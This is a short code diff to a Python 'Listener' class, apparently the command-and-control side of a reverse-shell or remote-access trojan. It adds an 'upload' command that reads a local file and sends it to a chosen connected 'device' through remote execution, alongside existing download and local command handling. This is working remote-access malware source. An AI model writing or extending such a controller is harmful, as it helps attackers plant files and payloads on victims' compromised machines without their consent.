@@ -163,6 +163,17 @@ class Listener:
 						self.write_file(file, res)
 				else: print(colored("[~] You have to choose one device", "yellow"))
 
+
+			elif command.strip() and command.split()[0] == "upload":
+				if self.chosen_connection:
+					file = command.replace("upload", "").strip()
+					if os.path.exists(file):
+						file = self.read_file(file)
+						res = self.execute_remotely("upload " + file)
+					else:
+						print(colored("[-] This file is not exists", "red"))
+
+
 			elif command.strip() and command.split()[0] == "l" and command.split()[1] == "ls":
 				res = UkDecode(subprocess.check_output("ls", shell = True))
 				print(res)
